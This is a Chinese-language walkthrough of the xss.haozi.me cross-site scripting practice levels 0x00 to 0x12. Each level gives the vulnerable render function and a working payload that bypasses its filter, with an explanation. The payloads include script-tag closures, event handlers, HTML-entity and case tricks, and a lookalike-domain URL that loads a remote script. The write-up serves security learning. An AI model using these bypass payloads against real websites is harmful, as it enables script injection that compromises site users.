entry.content:
xss-demo刷题记录网址：https://xss.haozi.me/

原文运行截图所在的旧对象存储已经失效。本文保留题目、代码和解题思路，截图不再展示。

相关知识刷题记录0x00server codefunction render (input) &#123;
  return '&lt;div>' + input + '&lt;/div>'
&#125;

input code&lt;script>alert(1)&lt;/script>

解释在标签内且无过滤。
运行截图0x01server codefunction render (input) &#123;
  return '&lt;textarea>' + input + '&lt;/textarea>'
&#125;

input code&lt;/textarea>&lt;script>alert(1)&lt;/script>

解释
文本框标签中无法弹窗，所以闭合”“标签。

运行截图0x02server codefunction render (input) &#123;
  return '&lt;input type="name" value="' + input + '">'
&#125;

input code">&lt;svg/onload=alert(1)>

解释
插入的代码在input标签的value属性中，可以直接闭合input标签。

运行截图0x03server codefunction render (input) &#123;
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
&#125;

input code&lt;script>alert`1`&lt;/script>

解释
过滤了圆括号。
模板字符串紧跟在函数名后面，该函数将被调用来处理这个模板字符串。
模板字符串使用反引号来代替普通字符串中的双引号和单引号。

运行结果0x04server codefunction render (input) &#123;
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
&#125;

input code&lt;script>window.onerror=eval;throw'=alert\x281\x29'&lt;/script
&lt;iframe srcdoc="&lt;script>parent.alert&amp;#40;1&amp;#41;&lt;/script>"
&lt;svg>&lt;script>alert&amp;#40;1&amp;#41&lt;/script

解释

过滤了圆括号和反引号。

““标签中可以直接执行HTML实体字符。

或者”“标签的srcdoc里面的内容可以直接在HTML中显示出来。



运行结果0x05server codefunction render (input) &#123;
  input = input.replace(/-->/g, '😂')
  return '&lt;!-- ' + input + ' -->'
&#125;

input code--!>&lt;script>alert(1)&lt;/script>

解释
将–&gt;替换成表情，并且输入的内容在注释中输出。
HTML两种注释方法：  &lt;!–注释–!&gt;  这里我们可以用对称感叹号的方法注释。

运行结果0x06server codefunction render (input) &amp;#123;
  input = input.replace(/auto|on.*=|&gt;/ig, &#39;_&#39;)
  return `&lt;input value=1 $&amp;#123;input&amp;#125; type=&quot;text&quot;&gt;`
&amp;#125;

input codetype=image src onerror
=alert(1)

解释
将以anto或者on开头，并且以等号结尾的标签属性替换成_ ，这里可以用换行。

运行结果0x07server codefunction render (input) &amp;#123;
  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi

  input = input.replace(stripTagsRe, &#39;&#39;)
  return `&lt;article&gt;$&amp;#123;input&amp;#125;&lt;/article&gt;`
&amp;#125;

input code1&lt;body onload=&quot;alert(1)&quot;

解释1
将以&lt;开头 &gt;结尾，并且忽略大小写的字符替换成空。
可以利用浏览器的容错，去掉&gt;。

运行截图1input code2&lt;svg/onload=alert(1)

解释2运行截图2运行结果0x08server codefunction render (src) &amp;#123;
  src = src.replace(/&lt;\/style&gt;/ig, &#39;/* \u574F\u4EBA */&#39;)
  return `
    &lt;style&gt;
      $&amp;#123;src&amp;#125;
    &lt;/style&gt;
  `
&amp;#125;

input code&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;

解释
将替换成\u574F\u4EBA，利用换行绕过。

运行结果0x09server codefunction render (input) &amp;#123;
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) &amp;#123;
    return `&lt;script src=&quot;$&amp;#123;input&amp;#125;&quot;&gt;&lt;/script&gt;`
  &amp;#125;
  return &#39;Invalid URL&#39;
&amp;#125;

input codehttps://www.segmentfault.com/&quot; onload=alert(1)&gt;

解释
要求以https://www.segmentfault.com开头的输入，否则失败。并且输入的url在script标签的src属性里面，还需要将这个标签闭合。

运行结果0x0Aserver codefunction render (input) &amp;#123;
  function escapeHtml(s) &amp;#123;
    return s.replace(/&amp;/g, &#39;&amp;amp;&#39;)
            .replace(/&#39;/g, &#39;&amp;#39;&#39;)
            .replace(/&quot;/g, &#39;&amp;quot;&#39;)
            .replace(/&lt;/g, &#39;&amp;lt;&#39;)
            .replace(/&gt;/g, &#39;&amp;gt;&#39;)
            .replace(/\//g, &#39;&amp;#x2f&#39;)
  &amp;#125;

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) &amp;#123;
    return `&lt;script src=&quot;$&amp;#123;escapeHtml(input)&amp;#125;&quot;&gt;&lt;/script&gt;`
  &amp;#125;
  return &#39;Invalid URL&#39;
&amp;#125;

input codehttps://www.segmentfault.com.wmcoder.site/j.js

解释
对很多符号进行了转义，例如&amp; ‘ “ &lt; &gt; &#x2F;  都转义成了html实体编码，html实体编码在html标签的属性中可以直接进行解析。并且匹配了以https://www.segmentfault.com开头的url。当我们访问 https://www.baidu.com@www.sina.com 的时候我们实际访问的是 https://www.sina,com。 所以这里我们可以用指定的url开头，但是用@符号来执行自己的js，在这个js中有弹窗的代码。

运行结果0x0Bserver codefunction render (input) &amp;#123;
  input = input.toUpperCase()
  return `&lt;h1&gt;$&amp;#123;input&amp;#125;&lt;/h1&gt;`
&amp;#125;

input code&lt;img src=&quot;x&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;

解释
输入的内容全部变成大写。在html标签和url中不区分大小写，但是js严格区分大小写。
所以我们可以在标签的属性内用https://xss.haozi.me/j.js 这里面的脚本来进行弹窗，或者是用alert(1)的时候进行编码，可以转成html编码。

运行结果0x0Cserver codefunction render (input) &amp;#123;
  input = input.replace(/script/ig, &#39;&#39;)
  input = input.toUpperCase()
  return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;
&amp;#125;

input code&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;

解释
把script替换成空，输入全部大写。
这里我们可以不用script标签

运行结果0x0Dserver codefunction render (input) &amp;#123;
  input = input.replace(/[&lt;/&quot;&#39;]/g, &#39;&#39;)
  return `
    &lt;script&gt;
          // alert(&#39;$&amp;#123;input&amp;#125;&#39;)
    &lt;/script&gt;
  `
&amp;#125;

input code')
alert(1)
-->

解释
将符号 &lt; &#x2F; “ ‘ 替换成空，并且输入的内容是注释，这里可以用换行绕过。并且用html的注释符 –&gt; 注释掉后面的单引号和圆括号。

运行结果0x0Eserver codefunction render (input) &#123;
  input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1')
  input = input.toUpperCase()
  return '&lt;h1>' + input + '&lt;/h1>'
&#125;

input code&lt;ſcript src="https://xss.haozi.me/j.js">&lt;/script>

解释
将 &lt; 开头的不管后面是什么字母都通通加上一个_ ，所以所有的标签都不能用。
字符ſ大写后为S。

运行结果0x0Fserver codefunction render (input) &#123;
  function escapeHtml(s) &#123;
    return s.replace(/&amp;/g, '&amp;amp;')
            .replace(/'/g, '&amp;#39;')
            .replace(/"/g, '&amp;quot;')
            .replace(/&lt;/g, '&amp;lt;')
            .replace(/>/g, '&amp;gt;')
            .replace(/\//g, '&amp;#x2f;')
  &#125;
  return `&lt;img src onerror="console.error('$&#123;escapeHtml(input)&#125;')">`
&#125;

input code');alert('1

解释
对字符 &amp; ‘ “ &lt; &gt; &#x2F; 进行html编码，输入的内容在img标签中，所以编码没有影响。内容在console.error中，我们可以闭合console.error，并且在onerror属性中添加一个alert。

运行结果0x10server codefunction render (input) &#123;
  return `
&lt;script>
  window.data = $&#123;input&#125;
&lt;/script>
  `
&#125;

input code'';alert(1)

解释
没有过滤，在script标签中直接执行。

运行结果0x11server code// from alf.nu
function render (s) &#123;
  function escapeJs (s) &#123;
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/&lt;/g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  &#125;
  s = escapeJs(s)
  return `
&lt;script>
  var url = 'javascript:console.log("$&#123;s&#125;")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
&lt;/script>
`
&#125;

input code"),alert("1

解释
过滤了很多的字符。并且将” 替换成  &quot; ，但是并没有什么卵用，\正好可以当做是双引号里面的内容。输入的内容在javascript:console.log里面，我们将这个闭合以后添加一个alert然后把后面的注释掉。

运行结果0x12server code// from alf.nu
function escape (s) &#123;
  s = s.replace(/"/g, '\\"')
  return '&lt;script>console.log("' + s + '");&lt;/script>'
&#125;

input code\");alert(1)//

解释
将 “ 替换成 &quot; ，输入的内容在console.log里面，在html标签外面，所以不能进行html编码。
这里可以直接闭合掉script标签，重新添加一个
&lt;/script>&lt;script>alert(1)&lt;/script>

也可以将替换的 &quot; 的 \在前面再添加一个\转义掉。
\");alert(1);//

运行结果
